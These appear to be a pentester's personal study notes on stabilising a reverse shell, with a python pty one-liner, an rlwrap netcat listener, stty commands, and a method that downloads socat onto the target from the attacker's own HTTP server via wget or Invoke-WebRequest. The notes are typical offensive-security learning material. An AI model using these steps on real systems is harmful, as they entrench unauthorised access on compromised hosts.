### shell_stabilisation


#### Technique 1: python


1. `python -c 'import pty;pty.spawn("/bin/bash")'`
2.  `export TERM=xterm`
3.  `stty raw -echo; fg`


![[Pasted image 20220817002908.png]]

#### Technique 2: rlwrap


1. `sudo apt install rlwrap`
2. `rlwrap nc -lvnp <port>`
3. `stty raw -echo; fg`

#### Techinique 3: socat

1. `sudo python3 -m http.server 80`
2. `wget <LOCAL-IP>/socat -O /tmp/socat`
3. `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile `
4. `C:\\Windows\temp\socat.exe`

![[Pasted image 20220817003104.png]]

in your shell type

1. `stty rows <number>`
2. `stty cols <number>`


